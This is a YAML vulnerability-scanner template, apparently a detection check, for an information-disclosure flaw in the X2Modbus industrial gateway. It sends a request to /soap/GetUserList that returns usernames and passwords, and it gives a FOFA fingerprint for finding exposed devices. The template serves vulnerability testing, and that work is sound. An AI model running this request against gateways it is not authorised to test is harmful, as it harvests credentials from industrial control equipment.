id: poc-yaml-x2modbus-getuserlist-info-leak
info:
  name: 迅饶科技 X2Modbus网关 /GetUserList 敏感信息泄露漏洞
  severity: medium
  tags:
  - 信息泄露
  finger: X2Modbus
  fofa: server="SunFull-Webs"
requests:
- method: GET
  path: /soap/GetUserList
  expression: 'status_code == 200 &&

    contains(body,"<?xml version") &&

    contains(body,"<soap:Body>") &&

    contains(body,"<PASSWORD>") &&

    contains(body,"<USERNAME>") &&

    contains(content_type,"text/xml")

    '
variables: {}
transport: http
